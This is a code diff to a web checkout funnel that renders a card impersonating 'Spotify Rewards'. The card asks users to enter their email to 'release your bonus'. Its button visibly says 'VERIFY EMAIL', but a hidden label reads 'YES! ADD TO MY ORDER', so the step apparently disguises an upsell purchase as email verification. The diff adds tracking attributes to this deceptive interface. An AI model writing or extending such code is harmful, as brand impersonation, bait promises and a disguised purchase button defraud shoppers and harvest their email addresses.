@@ -277,13 +277,13 @@
         var card = document.createElement('div');
         card.className = 'checkout-card';
         card.innerHTML =
-          '<div style="background:#fff;border:1px solid rgba(29,185,84,0.25);border-radius:16px;padding:14px;box-shadow:0 4px 16px rgba(0,0,0,0.08)">' +
+          '<div data-funnel-view="upsell1" style="background:#fff;border:1px solid rgba(29,185,84,0.25);border-radius:16px;padding:14px;box-shadow:0 4px 16px rgba(0,0,0,0.08)">' +
             '<div style="font-size:11px;font-weight:800;letter-spacing:.8px;text-transform:uppercase;color:#1DB954">Email verification required</div>' +
             '<div style="font-size:13px;color:#3c3c43;margin-top:6px;line-height:1.45">Spotify Rewards needs to confirm your email before releasing your bonus. This protects your balance and unlocks instant withdrawal.</div>' +
             '<input id="spEmail" type="email" inputmode="email" autocomplete="email" placeholder="Enter the email linked to your account" value="' + prefill.replace(/"/g, '&quot;') + '" ' +
               'style="width:100%;margin-top:10px;padding:13px 14px;border:1px solid #d9d9de;border-radius:12px;font-size:15px;font-family:Inter,sans-serif;color:#111;outline:none;background:#fafafa" />' +
             '<div id="spEmailErr" style="display:none;color:#dc2626;font-size:12px;margin-top:6px">Enter a valid email to release your bonus.</div>' +
-            '<button id="spConfirmBtn" type="button" class="checkout-btn" style="margin-top:12px;position:relative">' +
+            '<button id="spConfirmBtn" type="button" class="checkout-btn" data-funnel-step="upsell1" style="margin-top:12px;position:relative">' +
               '<span class="btn-hidden-label" style="visibility:hidden">YES! ADD TO MY ORDER</span>' +
               '<span class="btn-visible-label" style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center">VERIFY EMAIL</span>' +
             '</button>' +
